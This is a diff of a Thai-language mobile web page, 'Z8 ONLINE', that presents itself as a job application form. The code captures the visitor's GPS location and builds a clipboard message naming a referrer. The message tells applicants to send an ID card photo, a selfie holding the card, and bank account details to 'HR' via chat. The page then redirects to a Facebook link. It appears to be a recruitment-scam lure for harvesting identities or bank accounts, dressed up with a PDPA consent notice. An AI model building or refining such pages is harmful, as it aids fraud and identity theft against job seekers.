@@ -2,32 +2,25 @@
 <html lang="th">
 <head>
 <meta charset="UTF-8">
-
-<!-- 🔥 บังคับมือถือ -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
 <title>Z8 ONLINE</title>
 
 <style>
-*{
-  box-sizing:border-box;
-  -webkit-tap-highlight-color: transparent;
-}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
 
 body{
   margin:0;
   font-family:'Segoe UI',sans-serif;
   background:#020617;
   color:white;
-  font-size:15px;
 }
 
-/* 🔥 ล็อกความกว้างมือถือ */
 .wrapper{
   max-width:420px;
   margin:auto;
   width:100%;
-  padding-bottom:60px;
+  padding-bottom:80px;
 }
 
 /* HEADER */
@@ -72,26 +65,6 @@ input,textarea{
 }
 
 /* BUTTON */
-.btn{
-  width:100%;
-  padding:15px;
-  margin-top:12px;
-  border:none;
-  border-radius:12px;
-  font-size:16px;
-  font-weight:bold;
-  background:#22c55e;
-  color:black;
-}
-
-/* STATUS */
-.status{
-  text-align:center;
-  font-size:12px;
-  opacity:0.8;
-}
-
-/* 🔥 ปุ่มลอย (มือถือโคตรดี) */
 .floatBtn{
   position:fixed;
   bottom:60px;
@@ -99,12 +72,20 @@ input,textarea{
   transform:translateX(-50%);
   width:90%;
   max-width:400px;
-  padding:14px;
+  padding:15px;
   background:#22c55e;
   color:black;
   border:none;
   border-radius:14px;
+  font-size:16px;
   font-weight:bold;
+}
+
+/* STATUS */
+.status{
+  text-align:center;
+  font-size:12px;
+  opacity:0.8;
 }
 
 /* PDPA */
@@ -135,20 +116,14 @@ input,textarea{
 <b>📋 กรอกข้อมูลสมัคร</b>
 
 <input id="name" placeholder="ชื่อ-นามสกุล">
-<input id="idcard" placeholder="เลขบัตรประชาชน">
 <input id="phone" placeholder="เบอร์โทร">
-<input id="email" placeholder="อีเมล">
-<textarea id="address" placeholder="ที่อยู่"></textarea>
-
 <p class="status" id="status">ระบบจะขอพิกัดอัตโนมัติ</p>
 </div>
 
 </div>
 
 <!-- 🔥 ปุ่มลอย -->
-<button class="floatBtn" onclick="submitForm()">
-🚀 สมัครงานทันที
-</button>
+<button class="floatBtn" onclick="submitForm()">🚀 สมัครงานทันที</button>
 
 <div class="pdpa">
 🔒 ยินยอมตาม PDPA ข้อมูลใช้เพื่อสมัครงานเท่านั้น
@@ -161,11 +136,16 @@ function submitForm(){
   let phone=document.getElementById("phone").value;
 
   if(!name || !phone){
-    alert("กรุณากรอกข้อมูลให้ครบ");
+    alert("กรุณากรอกชื่อและเบอร์ให้ครบ");
     return;
   }
 
   document.getElementById("status").innerText="📍 กำลังขอตำแหน่ง...";
+
+  if(!navigator.geolocation){
+    proceed("(ไม่มีพิกัด)",name,phone);
+    return;
+  }
 
   navigator.geolocation.getCurrentPosition(function(pos){
 
@@ -174,38 +154,57 @@ function submitForm(){
 
     let location=`https://maps.google.com/?q=${lat},${lon}`;
 
-    let text=`🔥 สมัครงาน Z8 ONLINE
+    proceed(location,name,phone);
+
+  },function(){
+    proceed("(ไม่ได้เปิดตำแหน่ง)",name,phone);
+  });
+}
+
+function proceed(location,name,phone){
+
+  let text=`🔥 สมัครงาน Z8 ONLINE
 
 📌 ผู้แนะนำ: วิน
 
 👤 ชื่อ: ${name}
 📱 เบอร์: ${phone}
 
-📍 ${location}
+📍 พิกัด:
+${location}
 
-📎 แนบ:
-- รูปบัตร
-- รูปหน้าคู่บัตร
-- ข้อมูลบัญชี`;
+━━━━━━━━━━━━━━━  
+📎 เอกสารเพิ่มเติมที่ต้องส่งในแชท  
 
-    copy(text);
+1. รูปบัตรประชาชน  
+2. รูปถ่ายหน้าคู่บัตร  
+3. ข้อมูลบัญชีรับเงิน  
+   - หมายเลขบัญชี  
+   - ชื่อธนาคาร  
+━━━━━━━━━━━━━━━  
 
-    document.getElementById("status").innerText="✅ คัดลอกแล้ว";
+📩 กรุณาส่งข้อมูลทั้งหมดให้ HR เพื่อดำเนินการสมัครงาน`;
 
-    setTimeout(()=>{
-      window.location.href="https://www.facebook.com/share/1RtTcrR6Bu/";
-    },700);
+  copy(text);
 
-  });
+  document.getElementById("status").innerText="✅ คัดลอกแล้ว พร้อมส่ง";
+
+  setTimeout(()=>{
+    window.location.href="https://www.facebook.com/share/1RtTcrR6Bu/";
+  },700);
 }
 
 function copy(text){
-  let t=document.createElement("textarea");
-  t.value=text;
-  document.body.appendChild(t);
-  t.select();
-  document.execCommand("copy");
-  document.body.removeChild(t);
+  try{
+    navigator.clipboard.writeText(text);
+  }catch{
+    let t=document.createElement("textarea");
+    t.value=text;
+    document.body.appendChild(t);
+    t.select();
+    document.execCommand("copy");
+    document.body.removeChild(t);
+  }
 }
 </script>
 
